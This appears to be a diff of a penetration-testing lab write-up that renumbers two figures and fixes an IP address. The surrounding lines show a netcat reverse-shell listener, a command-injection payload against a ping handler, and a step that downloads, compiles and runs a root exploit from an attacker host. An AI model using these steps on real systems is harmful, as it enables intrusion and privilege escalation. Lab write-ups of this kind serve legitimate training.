@@ -57,7 +57,7 @@ nc -lvnp 4444
 <!-- 🖼️ PLACE FOURTH IMAGE HERE -->
 ![Initial Access Foothold](images/foothold_lvl2.png)
 
-*Figure 4: Setting up the Netcat listener to catch the interactive shell session.*
+*Figure 3: Setting up the Netcat listener to catch the interactive shell session.*
 
 ---
 
@@ -68,7 +68,7 @@ nc -lvnp 4444
 
 <!-- 🖼️ PLACE THIRD IMAGE HERE -->
 ![Command Injection Target Trigger](images/sql_command2_lvl2.png)
-*Figure 3: Delivering the unified logical payload to the backend ping handler.*
+*Figure 4: Delivering the unified logical payload to the backend ping handler.*
 
 **Result:** The web server executed the background task and sent back an interactive reverse shell session to the listener terminal as low-privilege web execution profile `apache`.
 
@@ -97,7 +97,7 @@ The exploit module was staged inside the Kali environment, served over an unencr
 ```bash
 # On Target Environment Shell
 cd /tmp
-wget http://192.168.0
+wget http://192.168.0.21
 gcc -o rootme exploit.c
 ./rootme
 ```
